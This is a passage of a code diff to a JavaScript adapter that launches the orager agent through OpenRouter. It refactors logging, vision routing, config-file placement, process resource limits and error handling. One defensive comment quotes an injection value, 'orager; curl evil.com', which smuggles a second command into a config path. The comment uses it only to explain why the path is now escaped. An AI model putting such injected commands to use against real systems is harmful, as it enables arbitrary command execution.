@@ -6,7 +6,7 @@ import { fileURLToPath } from "node:url";
 import os from "node:os";
 import crypto from "node:crypto";
 import { mintDaemonJwt } from "./jwt-utils.js";
-import { getModelFromLiveCache, _resetModelCacheForTesting } from "./list-models.js";
+import { _resetModelCacheForTesting } from "./list-models.js";
 import { processRateLimitTracker } from "../rate-limit-tracker.js";
 import { buildOragerSkillsDir, cleanupOragerSkillsDir } from "./skills.js";
 // ── Structured logging ────────────────────────────────────────────────────────
@@ -17,143 +17,42 @@ const STRUCTURED_LOG_FILE = process.env.ORAGER_LOG_FILE ?? "";
 // Capped at 10,000 entries (ring-buffer eviction) so long-lived Paperclip
 // worker processes do not accumulate unbounded memory across thousands of runs.
 const LOG_BUFFER_MAX = 10_000;
-const _structuredLogBuffer = [];
+// L-09: Ring buffer for O(1) eviction instead of O(n) Array.shift().
+class RingBuffer {
+    _cap;
+    _buf = [];
+    _head = 0;
+    _size = 0;
+    constructor(_cap) {
+        this._cap = _cap;
+    }
+    push(item) {
+        if (this._size < this._cap) {
+            this._buf.push(item);
+            this._size++;
+        }
+        else {
+            this._buf[this._head] = item;
+            this._head = (this._head + 1) % this._cap;
+        }
+    }
+    toArray() {
+        if (this._size < this._cap)
+            return this._buf.slice();
+        return [...this._buf.slice(this._head), ...this._buf.slice(0, this._head)];
+    }
+    get length() { return this._size; }
+    clear() { this._buf.length = 0; this._head = 0; this._size = 0; }
+}
+const _structuredLogBuffer = new RingBuffer(LOG_BUFFER_MAX);
 function structuredLog(entry) {
     _structuredLogBuffer.push(entry);
-    if (_structuredLogBuffer.length > LOG_BUFFER_MAX)
-        _structuredLogBuffer.shift();
     if (!STRUCTURED_LOG_FILE)
         return;
     try {
         appendFileSync(STRUCTURED_LOG_FILE, JSON.stringify({ ...entry, ts: entry.ts }) + "\n");
     }
     catch { /* never fail a run due to log write error */ }
-}
-// ── Cost anomaly detection ────────────────────────────────────────────────────
-// Module-level rolling window shared across all runs in this process.
-// Resets on process restart. Zero-cost runs (dry-run, free-tier) are excluded.
-const COST_WINDOW_SIZE = 20;
-// Minimum number of runs between anomaly alerts to prevent flooding onMeta/stderr
-// in batch workloads where every run is anomalous.
-const COST_ANOMALY_COOLDOWN_RUNS = 10;
-const _costWindow = [];
-let _runsSinceLastAnomaly = COST_ANOMALY_COOLDOWN_RUNS; // start ready to fire
-function recordRunCost(costUsd) {
-    if (costUsd <= 0)
-        return;
-    _costWindow.push(costUsd);
-    if (_costWindow.length > COST_WINDOW_SIZE)
-        _costWindow.shift();
-    _runsSinceLastAnomaly++;
-}
-function checkCostAnomaly(costUsd, agentId, runId, onLog) {
-    if (_costWindow.length < 3)
-        return;
-    if (_runsSinceLastAnomaly < COST_ANOMALY_COOLDOWN_RUNS)
-        return; // cooldown active
-    const avg = _costWindow.reduce((a, b) => a + b, 0) / _costWindow.length;
-    if (avg > 0 && costUsd > avg * 2) {
-        const multiplier = (costUsd / avg).toFixed(1);
-        const msg = `[openrouter adapter] COST ANOMALY: run cost $${costUsd.toFixed(4)} is ` +
-            `>${multiplier}x the rolling average ($${avg.toFixed(4)}, window=${_costWindow.length} runs)\n`;
-        void onLog("stderr", msg);
-        structuredLog({
-            level: "warn",
-            ts: Date.now(),
-            event: "cost_anomaly",
-            agentId,
-            runId,
-            costUsd,
-            rollingAvgCostUsd: avg,
-            windowSize: _costWindow.length,
-        });
-        _runsSinceLastAnomaly = 0; // reset cooldown
-    }
-}
-// ── Memory key ────────────────────────────────────────────────────────────────
-// Computes the key used to namespace orager's memory store.  When a workspace
-// repo URL is available the key includes a filesystem-safe slug derived from
-// the URL so that separate repos don't share memory.
-/** Convert a repo URL into a short filesystem-safe slug. */
-function repoSlug(repoUrl) {
-    // Strip scheme (e.g. "https://") then replace non-alphanumeric characters
-    // with underscores, collapse repeated underscores, trim leading/trailing
-    // underscores and truncate to 64 characters.
-    return repoUrl
-        .replace(/^[a-zA-Z][a-zA-Z0-9+\-.]*:\/\//, "") // strip scheme://
-        .replace(/[^a-zA-Z0-9_]/g, "_") // non-safe chars → _
-        .replace(/_+/g, "_") // collapse repeats
-        .replace(/^_+|_+$/g, "") // trim edges
-        .slice(0, 64);
-}
-/**
- * Build the memory key for orager.
- *
- * - Falls back to `agentId` alone when `repoUrl` is null or empty.
- * - Otherwise returns `${agentId}_${repoSlug(repoUrl)}` truncated to 128 chars.
- */
-export function buildMemoryKey(agentId, repoUrl) {
-    if (!repoUrl)
-        return agentId;
-    const slug = repoSlug(repoUrl);
-    if (!slug)
-        return agentId;
-    return `${agentId}_${slug}`.slice(0, 128);
-}
-// ── Vision support check ──────────────────────────────────────────────────────
-// Fetches OpenRouter /api/v1/models to verify the selected model reports
-// "image" in its input_modalities before sending image_url content blocks.
-// require_parameters: true (the default) filters providers that don't declare
-// vision support, but doesn't guarantee the model itself supports it — this
-// check makes the gap explicit with a structured warning.
-//
-// Returns:
-//   true  — model confirmed to support image inputs
-//   false — model confirmed NOT to support image inputs (warn loudly)
-//   null  — model not found in /models response or fetch failed (warn softly)
-//
-// Results are cached per model ID for 6 hours to avoid adding per-run latency.
-const _visionCache = new Map();
-export const VISION_CACHE_TTL_MS = 6 * 60 * 60 * 1000;
-// Keep the old internal name as an alias so nothing inside the module needs updating
-const _VISION_CACHE_TTL_MS = VISION_CACHE_TTL_MS;
-export async function checkVisionSupport(apiKey, model) {
-    const cached = _visionCache.get(model);
-    if (cached && Date.now() - cached.ts < _VISION_CACHE_TTL_MS)
-        return cached.supported;
-    // Prefer the shared model list when it's already in memory — avoids a redundant
-    // fetch on every run. The list is populated by listOpenRouterModels() (e.g. called
-    // by the UI model dropdown), so no additional network call is needed here.
-    const liveEntry = getModelFromLiveCache(model);
-    if (liveEntry !== undefined) {
-        _visionCache.set(model, { supported: liveEntry.supportsVision, ts: Date.now() });
-        return liveEntry.supportsVision;
-    }
-    const base = (process.env.OPENROUTER_BASE_URL ?? "https://openrouter.ai/api/v1").replace(/\/$/, "");
-    try {
-        const res = await fetch(`${base}/models`, {
-            headers: { Authorization: `Bearer ${apiKey}` },
-            signal: AbortSignal.timeout(8_000),
-        });
-        if (!res.ok) {
-            _visionCache.set(model, { supported: null, ts: Date.now() });
-            return null;
-        }
-        const json = await res.json();
-        const entry = (json.data ?? []).find((m) => m.id === model);
-        if (!entry) {
-            _visionCache.set(model, { supported: null, ts: Date.now() });
-            return null;
-        }
-        const modalities = entry.input_modalities ?? entry.architecture?.input_modalities ?? [];
-        const supported = modalities.includes("image");
-        _visionCache.set(model, { supported, ts: Date.now() });
-        return supported;
-    }
-    catch {
-        _visionCache.set(model, { supported: null, ts: Date.now() });
-        return null;
-    }
 }
 // ── API key pool ──────────────────────────────────────────────────────────────
 // Collects all configured API keys (primary + apiKeys array) and returns the
@@ -201,7 +100,14 @@ export function processOragerEvent(event, state, onLog, onSessionLost) {
         state.resultEvent = event;
     }
     if (event.type === "question" && !state.questionEvent) {
-        state.questionEvent = event;
+        // M-20: Validate shape before casting — ensure required fields exist with
+        // correct types to prevent downstream crashes from malformed events.
+        if (typeof event.prompt === "string" &&
+            Array.isArray(event.choices) &&
+            typeof event.toolCallId === "string" &&
+            typeof event.toolName === "string") {
+            state.questionEvent = event;
+        }
     }
 }
 // ── Daemon auto-start rate limiter ────────────────────────────────────────
@@ -344,16 +250,27 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 // skills/ dir is at the root of the adapter package (two levels up from dist/server/)
 const SKILLS_DIR = path.resolve(__dirname, "..", "..", "skills");
-// Warn at load time if the bundled skills directory is missing — this can happen
-// when the package is loaded from an unexpected location (symlink, monorepo hoisting).
-// Non-fatal: addDirs will include a non-existent path, which orager silently ignores.
-fs.stat(SKILLS_DIR).then((s) => {
-    if (!s.isDirectory()) {
-        process.stderr.write(`[openrouter adapter] WARNING: bundled skills directory is not a directory: ${SKILLS_DIR}\n`);
+// L-13: Skills directory validation moved from module-level floating promise
+// to lazy, cached check on first use.
+let _skillsDirChecked = false;
+let _skillsDirValid = false;
+async function ensureSkillsDirChecked() {
+    if (_skillsDirChecked)
+        return _skillsDirValid;
+    _skillsDirChecked = true;
+    try {
+        const s = await fs.stat(SKILLS_DIR);
+        _skillsDirValid = s.isDirectory();
+        if (!_skillsDirValid) {
+            process.stderr.write(`[openrouter adapter] WARNING: bundled skills directory is not a directory: ${SKILLS_DIR}\n`);
+        }
     }
-}).catch(() => {
-    process.stderr.write(`[openrouter adapter] WARNING: bundled skills directory not found: ${SKILLS_DIR} — Paperclip skills (get-task, post-comment, etc.) will not be available\n`);
-});
+    catch {
+        process.stderr.write(`[openrouter adapter] WARNING: bundled skills directory not found: ${SKILLS_DIR} — Paperclip skills (get-task, post-comment, etc.) will not be available\n`);
+        _skillsDirValid = false;
+    }
+    return _skillsDirValid;
+}
 import { asString, asNumber, asBoolean, parseObject, buildPaperclipEnv, renderTemplate, joinPromptSections, } from "@paperclipai/adapter-utils/server-utils";
 // ── Local utility shims ───────────────────────────────────────────────────────
 // These mirror functions in newer versions of @paperclipai/adapter-utils that
@@ -498,19 +415,10 @@ function ensurePathInEnv(env) {
     return { ...env, PATH: process.env.PATH ?? "/usr/local/bin:/usr/bin:/bin" };
 }
 /**
- * Check that all required environment variable names are present and non-empty.
- * Returns an array of missing variable names.
- */
-function checkRequiredEnvVars(required, env) {
-    if (!Array.isArray(required))
-        return [];
-    return required.filter((v) => typeof v === "string" && v.trim().length > 0 && !env[v.trim()]);
-}
-/**
  * Execute an agent run by POSTing to the orager daemon.
  * Returns the same AdapterExecutionResult shape as the spawn path.
  */
-async function executeViaDaemon(baseUrl, signingKey, agentId, runId, prompt, promptContent, daemonOpts, timeoutSec, onLog, maxCostUsdSoft) {
+async function executeViaDaemon(baseUrl, signingKey, agentId, runId, prompt, promptContent, daemonOpts, timeoutSec, onLog) {
     const token = mintDaemonJwt(signingKey, agentId);
     const tokenMintedAt = Date.now();
     /** Re-mint if more than 12 minutes have passed (leaves 3-min buffer before 15-min expiry). */
@@ -684,20 +592,32 @@ async function executeViaDaemon(baseUrl, signingKey, agentId, runId, prompt, pro
                 if (discarded.includes('"type":"result"') || discarded.includes('"type":"question"')) {
                     void onLog("stderr", `[openrouter adapter] WARNING: oversized stream segment (~${discarded.length} bytes) may contain a result/question event — attempting to parse\n`);
                     structuredLog({ level: "warn", ts: Date.now(), event: "daemon_oversized_segment_critical", agentId, segmentBytes: discarded.length, message: "Oversized segment contains result/question event — attempting recovery" });
-                    // Try to extract and process the critical event from the oversized line
-                    const criticalMatch = discarded.match(/\{"type":"(?:result|question)"[^\n]*/);
-                    if (criticalMatch) {
+                    // M-21: Split by newlines first, then attempt parsing each line.
+                    // The previous regex approach used greedy [^\n]* which could capture
+                    // malformed partial JSON from adjacent events.
+                    let recoveredCritical = false;
+                    for (const candidateLine of discarded.split("\n")) {
+                        const trimmed = candidateLine.trim();
+                        if (!trimmed.startsWith("{"))
+                            continue;
                         try {
-                            const event = JSON.parse(criticalMatch[0]);
-                            if (event.type === "result")
+                            const event = JSON.parse(trimmed);
+                            if (event.type === "result") {
                                 streamState.resultEvent = event;
+                                recoveredCritical = true;
+                            }
+                            if (event.type === "question") {
+                                processOragerEvent(event, streamState, onLog, () => { });
+                                recoveredCritical = true;
+                            }
                         }
                         catch {
-                            // Parse failed — the result event is unrecoverable. Log so operators
-                            // know the run will end with a synthesised error rather than silently.
-                            structuredLog({ level: "error", ts: Date.now(), event: "daemon_oversized_segment_unrecoverable", agentId, segmentBytes: discarded.length, message: "Could not parse result event from oversized segment — run will end with synthesised error" });
-                            void onLog("stderr", `[openrouter adapter] ERROR: could not parse result event from oversized segment (${discarded.length} bytes) — run result lost\n`);
+                            // Individual line parse failure — try next line
                         }
+                    }
+                    if (!recoveredCritical) {
+                        structuredLog({ level: "error", ts: Date.now(), event: "daemon_oversized_segment_unrecoverable", agentId, segmentBytes: discarded.length, message: "Could not parse result event from oversized segment — run will end with synthesised error" });
+                        void onLog("stderr", `[openrouter adapter] ERROR: could not parse result event from oversized segment (${discarded.length} bytes) — run result lost\n`);
                     }
                 }
                 else {
@@ -779,11 +699,6 @@ async function executeViaDaemon(baseUrl, signingKey, agentId, runId, prompt, pro
         exitCode: null, // helper will compute it from subtype
         signal: null,
     });
-    const daemonCostUsd = builtResult.costUsd ?? 0;
-    if (maxCostUsdSoft !== undefined && daemonCostUsd >= maxCostUsdSoft) {
-        structuredLog({ level: "warn", ts: Date.now(), event: "soft_cost_limit", agentId, runId, costUsd: daemonCostUsd, message: `Run cost $${daemonCostUsd.toFixed(4)} exceeded soft limit $${maxCostUsdSoft}` });
-        void onLog("stderr", `[openrouter adapter] soft cost limit reached ($${daemonCostUsd.toFixed(4)} >= $${maxCostUsdSoft}) — consider adjusting maxCostUsd\n`);
-    }
     return {
         ...builtResult,
         question: questionEvent
@@ -934,14 +849,7 @@ export async function executeAgentLoop(ctx) {
             message: `wakeReasonModels: routing '${wakeReason}' → '${effectiveModel}' (base model: '${model}')`,
         });
     }
-    // ── onlineSearch — append :online suffix for web-search-enabled runs ────────
-    // When onlineSearch is true and the model has no existing variant suffix
-    // (:online, :nitro, :thinking, etc.) the suffix is appended so OpenRouter
-    // routes to a web-search-capable provider variant.
     const onlineSearch = asBoolean(config.onlineSearch, false);
-    if (onlineSearch && !effectiveModel.includes(":")) {
-        effectiveModel = `${effectiveModel}:online`;
-    }
     // ── agentId override — caller-supplied identity for Anthropic metadata ──────
     // When config.agentId is provided it overrides agent.id as the identity sent
     // to the orager daemon (JWT subject → metadata.user_id in Anthropic requests).
@@ -1139,8 +1047,10 @@ export async function executeAgentLoop(ctx) {
     const injectContext = asBoolean(config.injectContext, false);
     const bashPolicy = parseObject(config.bashPolicy);
     const hooksRaw = parseObject(config.hooks);
+    // L-12: Accept both string and object-valued hooks. Previously only string
+    // hooks were kept, silently dropping structured hook configurations.
     const hooks = Object.keys(hooksRaw).length > 0
-        ? Object.fromEntries(Object.entries(hooksRaw).filter(([, v]) => typeof v === "string"))
+        ? Object.fromEntries(Object.entries(hooksRaw).filter(([, v]) => typeof v === "string" || (typeof v === "object" && v !== null)))
         : undefined;
     const trackFileChanges = asBoolean(config.trackFileChanges, false);
     const enableBrowserTools = asBoolean(config.enableBrowserTools, false);
@@ -1194,7 +1104,8 @@ export async function executeAgentLoop(ctx) {
         }
         structuredLog({ level: "info", ts: Date.now(), event: "skills_linked", agentId: agent.id, runId, message: `Linked ${ephemeralSkillsDir.linked.length} skill(s) into ephemeral dir: ${ephemeralSkillsDir.linked.join(", ") || "(none)"}` });
     }
-    const addDirs = ephemeralSkillsDir ? [ephemeralSkillsDir.dir] : [SKILLS_DIR];
+    const skillsDirOk = await ensureSkillsDirChecked();
+    const addDirs = ephemeralSkillsDir ? [ephemeralSkillsDir.dir] : (skillsDirOk ? [SKILLS_DIR] : []);
     if (Array.isArray(config.addDirs)) {
         for (const d of config.addDirs) {
             if (typeof d === "string" && d.trim())
@@ -1438,86 +1349,22 @@ export async function executeAgentLoop(ctx) {
             })),
         ]
         : null;
-    // ── Vision capability check ───────────────────────────────────────────────
-    // When the run carries image attachments, verify the selected model actually
-    // reports image support via OpenRouter before writing config or hitting the
-    // daemon. require_parameters: true (the default) will filter providers that
-    // don't declare vision support, but the model-level check is a separate
-    // question — not all providers expose vision for every model even when the
-    // base weights support it.
-    let visionFallbackNote = null;
-    if (promptContent !== null) {
-        const visionOk = await checkVisionSupport(apiKey, effectiveModel);
-        if (visionOk === false) {
-            // Model confirmed to not support vision. Try the fallback chain.
-            // visionFallbackModels controls the candidates:
-            //   • undefined/omitted → use DEFAULT_VISION_FALLBACK_MODELS
-            //   • []                → DISABLES fallback entirely (images sent as-is)
-            //   • ["model/id", …]   → use the provided list instead of the default
-            // Default chain: Gemini 2.0 Flash → GPT-4o → Claude Sonnet — all
-            // confirmed vision-capable on OpenRouter and ordered by cost/speed.
-            const fallbackExplicitlyDisabled = Array.isArray(config.visionFallbackModels) &&
-                config.visionFallbackModels.length === 0;
-            const fallbackCandidates = Array.isArray(config.visionFallbackModels)
-                ? config.visionFallbackModels.filter((m) => typeof m === "string" && m.trim().length > 0)
-                : DEFAULT_VISION_FALLBACK_MODELS;
-            let fallbackModel = null;
-            for (const candidate of fallbackCandidates) {
-                if (candidate === effectiveModel)
-                    continue; // skip — already failed
-                const candidateOk = await checkVisionSupport(apiKey, candidate);
-                if (candidateOk === true) {
-                    fallbackModel = candidate;
-                    break;
-                }
-            }
-            if (fallbackModel) {
-                const originalModel = effectiveModel;
-                effectiveModel = fallbackModel;
-                visionFallbackNote = `vision fallback: ${originalModel} → ${fallbackModel}`;
-                // Recompute timeout for the new model (only matters when not explicitly set).
-                timeoutSec = Math.max(0, safeNumber(config.timeoutSec, defaultTimeoutForModel(effectiveModel)));
-                structuredLog({
-                    level: "warn", ts: Date.now(), event: "vision_model_fallback",
-                    agentId: agent.id, runId,
-                    originalModel, fallbackModel,
-                    message: `Model "${originalModel}" does not support vision — falling back to "${fallbackModel}".`,
-                });
-                void onLog("stderr", `[openrouter adapter] model "${originalModel}" does not support image inputs — falling back to "${fallbackModel}".\n`);
-            }
-            else {
-                // No working fallback found — either all candidates lack vision or
-                // the user explicitly disabled the fallback chain with [].
-                if (fallbackExplicitlyDisabled) {
-                    visionFallbackNote = "vision fallback disabled (visionFallbackModels: [])";
-                }
-                else {
-                    visionFallbackNote = "vision: no fallback available";
-                }
-                structuredLog({
-                    level: "warn", ts: Date.now(), event: "vision_not_supported",
-                    agentId: agent.id, runId, model: effectiveModel,
-                    fallbackDisabled: fallbackExplicitlyDisabled,
-                    message: fallbackExplicitlyDisabled
-                        ? `Model "${effectiveModel}" does not support vision and visionFallbackModels is [] (fallback disabled). Images may be silently stripped or cause an API error.`
-                        : `Model "${effectiveModel}" does not support vision and no vision-capable fallback was available. Images may be silently stripped or cause an API error.`,
-                });
-                void onLog("stderr", fallbackExplicitlyDisabled
-                    ? `[openrouter adapter] WARNING: model "${effectiveModel}" does not support image inputs and vision fallback is disabled (visionFallbackModels: []) — images may be silently stripped or cause an error.\n`
-                    : `[openrouter adapter] WARNING: model "${effectiveModel}" does not support image inputs and no vision fallback was available — images may be silently stripped or cause an error.\n`);
-            }
-        }
-        else if (visionOk === null) {
-            // Could not verify — soft warning only, require_parameters handles provider filtering.
-            structuredLog({
-                level: "warn", ts: Date.now(), event: "vision_support_unknown",
-                agentId: agent.id, runId, model: effectiveModel,
-                message: `Could not verify vision support for "${effectiveModel}" (not found in OpenRouter /models or fetch failed). Images will be sent; require_parameters: true will filter non-vision providers.`,
-            });
-            void onLog("stderr", `[openrouter adapter] WARNING: could not verify vision support for model "${effectiveModel}" — proceeding with require_parameters: true.\n`);
-        }
-        // visionOk === true: confirmed, no action needed
-    }
+    // ── Vision routing — delegated to orager ─────────────────────────────────
+    // Vision capability detection and model swapping is handled inside orager's
+    // loop.ts using its live model metadata cache. The adapter's job is simply to
+    // pass the configured visionModel through so orager can act on it.
+    // config.visionModel is set by the user via the Paperclip adapter config UI.
+    const visionFallbackNote = promptContent !== null && asString(config.visionModel, "").trim()
+        ? `visionModel configured: ${asString(config.visionModel, "").trim()} (routing handled by orager)`
+        : null;
+    // Pre-read the instructions file once, shared by both spawn and daemon paths.
+    // Using appendSystemPrompt (string content) on both paths guarantees identical
+    // orager semantics regardless of which execution path is taken. Previously the
+    // spawn path sent systemPromptFile (a path string) while the daemon path sent
+    // appendSystemPrompt (file contents) — orager may treat these differently. (audit F6/H5)
+    const instructionsFileContent = safeInstructionsFilePath
+        ? await fs.readFile(safeInstructionsFilePath, "utf8").catch(() => undefined)
+        : undefined;
     // ── Build config object and write to temp file ────────────────────────────
     // Instead of building 50+ CLI args, we write all config to a temp JSON file
     // and pass --config-file <path> as the only config arg. This avoids argument
@@ -1539,8 +1386,8 @@ export async function executeAgentLoop(ctx) {
         };
         if (previousSessionId)
             obj.sessionId = previousSessionId;
-        if (safeInstructionsFilePath)
-            obj.systemPromptFile = safeInstructionsFilePath;
+        if (instructionsFileContent)
+            obj.appendSystemPrompt = instructionsFileContent;
         if (dangerouslySkipPermissions)
             obj.dangerouslySkipPermissions = true;
         if (sandboxRoot)
@@ -1606,7 +1453,7 @@ export async function executeAgentLoop(ctx) {
             obj.quantizations = quantizations.split(",").filter(Boolean);
         if (preset)
             obj.preset = preset;
-        // Fallback models
+        // Fallback models (orager applies :online suffix when onlineSearch is set)
         if (models.length > 0)
             obj.models = models;
         // Transforms
@@ -1637,6 +1484,10 @@ export async function executeAgentLoop(ctx) {
             obj.summarizeModel = summarizeModel;
         if (summarizeKeepRecentTurns !== undefined)
             obj.summarizeKeepRecentTurns = summarizeKeepRecentTurns;
+        // Vision model — pass through to orager which owns vision routing logic
+        const _visionModel = asString(config.visionModel, "").trim();
+        if (_visionModel)
+            obj.visionModel = _visionModel;
         // Extended agent loop options
         if (tagToolOutputs !== undefined)
             obj.tagToolOutputs = tagToolOutputs;
@@ -1695,7 +1546,8 @@ export async function executeAgentLoop(ctx) {
         // for the spawn path; adapter-level check above handles daemon path).
         if (requiredEnvVars.length > 0)
             obj.requiredEnvVars = requiredEnvVars;
-        obj.memoryKey = buildMemoryKey(effectiveAgentId, workspaceRepoUrl);
+        if (workspaceRepoUrl)
+            obj.repoUrl = workspaceRepoUrl;
         // Per-agent API key isolation
         const _agentApiKey = asString(config.agentApiKey, "");
         if (_agentApiKey.trim())
@@ -1720,9 +1572,13 @@ export async function executeAgentLoop(ctx) {
         return obj;
     };
     const configObj = buildConfigFilePayload();
-    // Write config to a crypto-random temp file, chmod 600 before writing content
+    // M-27: Write config to a user-private directory instead of world-listable /tmp.
+    // ~/.orager/tmp/ is only readable by the current user, preventing filename
+    // discovery by other users on multi-tenant systems.
+    const privateDir = path.join(os.homedir(), ".orager", "tmp");
+    await fs.mkdir(privateDir, { recursive: true, mode: 0o700 });
     const configFileName = `orager-config-${crypto.randomBytes(16).toString("hex")}.json`;
-    const configFilePath = path.join(os.tmpdir(), configFileName);
+    const configFilePath = path.join(privateDir, configFileName);
     let configFileWritten = false;
     try {
         // Create the file with mode 600 (owner read/write only) before writing content
@@ -1893,23 +1749,6 @@ export async function executeAgentLoop(ctx) {
         env.OTEL_RESOURCE_ATTRIBUTES = otelResourceAttrs;
     // Merge with process.env and ensure PATH is populated
     const effectiveEnv = ensurePathInEnv({ ...process.env, ...env });
-    // ── Per-agent environment validation ────────────────────────────────────────
-    const missingVars = checkRequiredEnvVars(requiredEnvVars, effectiveEnv);
-    if (missingVars.length > 0) {
-        structuredLog({ level: "error", ts: Date.now(), event: "env_var_missing", agentId: agent.id, runId, message: `Missing: ${missingVars.join(", ")}` });
-        // Clean up the config file — orager will never run to delete it for us
-        if (configFileWritten)
-            await fs.unlink(configFilePath).catch(() => { });
-        if (ephemeralSkillsDir)
-            await cleanupOragerSkillsDir(ephemeralSkillsDir.dir);
-        return {
-            exitCode: 1,
-            signal: null,
-            timedOut: false,
-            errorMessage: `Missing required environment variables: ${missingVars.join(", ")}`,
-            errorCode: "config_error",
-        };
-    }
     // ── Dry-run mode ────────────────────────────────────────────────────────────
     if (dryRun) {
         // Clean up the config file written above — no subprocess will delete it for us
@@ -2062,6 +1901,7 @@ export async function executeAgentLoop(ctx) {
                         summarizeAt,
                         summarizeModel: summarizeModel || undefined,
                         summarizeKeepRecentTurns,
+                        visionModel: asString(config.visionModel, "").trim() || undefined,
                         tagToolOutputs,
                         planMode: planMode || undefined,
                         injectContext: injectContext || undefined,
@@ -2083,9 +1923,7 @@ export async function executeAgentLoop(ctx) {
                         maxSpawnDepth,
                         maxIdenticalToolCallTurns,
                         toolErrorBudgetHardStop,
-                        appendSystemPrompt: safeInstructionsFilePath
-                            ? await fs.readFile(safeInstructionsFilePath, "utf8").catch(() => undefined)
-                            : undefined,
+                        appendSystemPrompt: instructionsFileContent,
                         promptContent: promptContent ?? undefined,
                         approvalMode,
                         ...(approvalAnswer ? { approvalAnswer } : {}),
@@ -2094,7 +1932,7 @@ export async function executeAgentLoop(ctx) {
                         ...(apiKeyPool.length > 1 ? { apiKeys: apiKeyPool } : {}),
                         ...(requiredEnvVars.length > 0 ? { requiredEnvVars } : {}),
                         ...(asString(config.agentApiKey, "").trim() ? { agentApiKey: asString(config.agentApiKey, "").trim() } : {}),
-                        memoryKey: buildMemoryKey(effectiveAgentId, workspaceRepoUrl),
+                        ...(workspaceRepoUrl ? { repoUrl: workspaceRepoUrl } : {}),
                         ...(["embedding", "fts", "local"].includes(asString(config.memoryRetrieval, ""))
                             ? {
                                 memoryRetrieval: asString(config.memoryRetrieval, ""),
@@ -2108,7 +1946,7 @@ export async function executeAgentLoop(ctx) {
                     };
                 };
                 const daemonOpts = await buildDaemonRunOpts();
-                const daemonResult = await executeViaDaemon(daemonBaseUrl, signingKey, effectiveAgentId, runId, prompt, promptContent, daemonOpts, timeoutSec, onLog, maxCostUsdSoft);
+                const daemonResult = await executeViaDaemon(daemonBaseUrl, signingKey, effectiveAgentId, runId, prompt, promptContent, daemonOpts, timeoutSec, onLog);
                 if (daemonResult !== null) {
                     structuredLog({
                         level: "info",
@@ -2143,11 +1981,6 @@ export async function executeAgentLoop(ctx) {
                             ...(workspaceRepoRef ? { repoRef: workspaceRepoRef } : {}),
                         };
                     }
-                    // Cost anomaly detection
-                    if (typeof daemonResult.costUsd === "number") {
-                        recordRunCost(daemonResult.costUsd);
-                        checkCostAnomaly(daemonResult.costUsd, agent.id, runId, onLog);
-                    }
                     return daemonResult;
                 }
                 // null = daemon at capacity after retry — fall through to spawn
@@ -2170,6 +2003,9 @@ export async function executeAgentLoop(ctx) {
         if (configFileWritten) {
             await fs.unlink(configFilePath).catch(() => { });
         }
+        // M-25: Clean up ephemeral skills directory — was previously orphaned here
+        if (ephemeralSkillsDir)
+            await cleanupOragerSkillsDir(ephemeralSkillsDir.dir);
         return {
             exitCode: 1,
             signal: null,
@@ -2200,7 +2036,31 @@ export async function executeAgentLoop(ctx) {
         }
         let proc;
         try {
-            proc = spawn(cliPath, args, {
+            // ── OS resource limits (audit N-01) ─────────────────────────────────
+            // Wrap the spawn in a shell with ulimit to cap memory and CPU time.
+            // Configurable via ORAGER_CLI_MEM_LIMIT_KB (default 4GB) and
+            // ORAGER_CLI_CPU_LIMIT_SECS (default unlimited = 0).
+            const memLimitKb = parseInt(process.env["ORAGER_CLI_MEM_LIMIT_KB"] ?? "", 10) || 4 * 1024 * 1024;
+            const cpuLimitSecs = parseInt(process.env["ORAGER_CLI_CPU_LIMIT_SECS"] ?? "", 10) || 0;
+            const platform = process.platform;
+            let spawnCmd;
+            let spawnArgs;
+            if (platform === "darwin" || platform === "linux") {
+                const ulimits = [`ulimit -v ${memLimitKb}`];
+                if (cpuLimitSecs > 0)
+                    ulimits.push(`ulimit -t ${cpuLimitSecs}`);
+                const quotedArgs = args.map((a) => `'${a.replace(/'/g, "'\\''")}'`).join(" ");
+                spawnCmd = "bash";
+                // R-08: Escape cliPath to prevent command injection via malicious config values.
+                // Without this, a cliPath like "orager; curl evil.com" would execute arbitrary commands.
+                const escapedCliPath = `'${cliPath.replace(/'/g, "'\\''")}'`;
+                spawnArgs = ["-c", `${ulimits.join(" && ")} && exec ${escapedCliPath} ${quotedArgs}`];
+            }
+            else {
+                spawnCmd = cliPath;
+                spawnArgs = args;
+            }
+            proc = spawn(spawnCmd, spawnArgs, {
                 cwd,
                 env: effectiveEnv,
                 stdio: ["pipe", "pipe", "pipe"],
@@ -2222,7 +2082,15 @@ export async function executeAgentLoop(ctx) {
             });
             return;
         }
-        // Write prompt to stdin
+        // Write prompt to stdin.
+        // Attach an error handler before writing — on Linux, EPIPE from a process
+        // that closes stdin early surfaces as an async 'error' event on the stream,
+        // not a thrown exception. Without this listener it becomes an unhandled error.
+        proc.stdin?.on("error", (stdinErr) => {
+            if (stdinErr.code !== "EPIPE") {
+                void onLog("stderr", `[openrouter adapter] WARNING: stdin error (${stdinErr.message}) — orager may not have received the prompt\n`);
+            }
+        });
         try {
             proc.stdin?.write(prompt, "utf8");
             proc.stdin?.end();
@@ -2254,7 +2122,10 @@ export async function executeAgentLoop(ctx) {
                     }
                 }
                 catch {
-                    proc.kill("SIGTERM");
+                    try {
+                        proc.kill("SIGTERM");
+                    }
+                    catch { /* M-19: process may have already exited */ }
                 }
                 // Force kill after grace period if the process doesn't exit on its own
                 if (graceSec > 0) {
@@ -2268,7 +2139,10 @@ export async function executeAgentLoop(ctx) {
                             }
                         }
                         catch {
-                            proc.kill("SIGKILL");
+                            try {
+                                proc.kill("SIGKILL");
+                            }
+                            catch { /* M-19: process may have already exited */ }
                         }
                     }, graceSec * 1000);
                 }
@@ -2277,8 +2151,33 @@ export async function executeAgentLoop(ctx) {
         // Read stdout line by line and stream to Paperclip.
         // Cap the in-memory buffer to prevent OOM from runaway binary output.
         const MAX_STDOUT_BUFFER_BYTES = 1 * 1024 * 1024; // 1 MB per partial line
+        // Total response body cap (audit N-02) — abort if response exceeds limit.
+        const MAX_TOTAL_RESPONSE_BYTES = parseInt(process.env["ORAGER_MAX_RESPONSE_BYTES"] ?? "", 10) || 50 * 1024 * 1024;
+        let totalResponseBytes = 0;
+        let responseTruncated = false;
         let stdoutBuffer = "";
         proc.stdout?.on("data", (chunk) => {
+            const chunkLen = typeof chunk === "string" ? Buffer.byteLength(chunk) : chunk.length;
+            totalResponseBytes += chunkLen;
+            if (totalResponseBytes > MAX_TOTAL_RESPONSE_BYTES && !responseTruncated) {
+                responseTruncated = true;
+                void onLog("stderr", `[openrouter adapter] response exceeded ${MAX_TOTAL_RESPONSE_BYTES} bytes — killing process\n`);
+                try {
+                    if (proc.pid != null)
+                        process.kill(-proc.pid, "SIGTERM");
